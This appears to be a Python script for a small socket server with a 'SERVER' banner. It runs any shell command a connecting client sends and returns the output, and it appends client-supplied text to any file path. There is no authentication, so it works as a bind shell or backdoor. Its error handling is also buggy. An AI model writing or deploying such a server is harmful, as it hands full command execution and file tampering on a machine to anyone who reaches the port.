import socket
import subprocess
import threading
import time
subprocess.run('clear',shell=True)
print('''
.d8888.      d88888b      d8888b.      db    db      d88888b      d8888b. 
88'  YP      88'          88  `8D      88    88      88'          88  `8D 
`8bo.        88ooooo      88oobY'      Y8    8P      88ooooo      88oobY' 
  `Y8b.      88~~~~~      88`8b        `8b  d8'      88~~~~~      88`8b   
db   8D      88.          88 `88.       `8bd8'       88.          88 `88. 
`8888Y'      Y88888P      88   YD         YP         Y88888P      88   YD 
                                                                         ''')
HOST = socket.gethostbyname(socket.gethostname())
PORT = 5050
FORMAT = "utf-8"
ADDR = (HOST,PORT)
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind(ADDR)
server.listen()
def handler(conn,addr):
    print(f"[Connection] --> new connection form {addr}")
    connected= True
    while connected:
        try:
            msg = conn.recv(1024).decode(FORMAT)
            if msg == "":
                print(f"[*] USER {addr} dissconnected ")
                start()
                break
            else :
                if "cmd" in msg:
                    msgc = msg.replace("cmd","")
                    cmd(conn,msgc)
                elif "file" in msg:
                    li= msg.replace("file", "")
                    conte = li.split()
                    path = ""
                    content = ""
                    lines  = 0
                    for i in conte:
                        lines = lines + 1
                        if lines == 1:
                            path = path + i
                        elif lines != 1:
                            i = i + " "
                            content = content + i
                    file(path,content,conn)
                        

        except:
            pass
def cmd(conn,msgc):
    try:
        run= subprocess.getoutput(msgc)
        ret = run.encode(FORMAT)
        conn.send(ret)
    except:
        conn.send("[*] Wrong command").encode(FORMAT)
        conn.send(run).encode(FORMAT)
def file(filed,content,conn):
    c=content.encode("utf-8")
    
    f = open(filed,'ab')
    f.write(c)
    f.close()
    
    with open(filed,"rb") as check:
        if c in check.read():
            h = f"Succesfully created file at {filed} which has {c}".encode(FORMAT)
            conn.send(h)
        else:
            conn.send("Failed to create").encode(FORMAT)

def start():
    conn , addr = server.accept()
    #print(addr)
    thread = threading.Thread(target=handler, args= (conn,addr))
    thread.start()
print (f" [Starting] --> server is started on {ADDR}")
start()
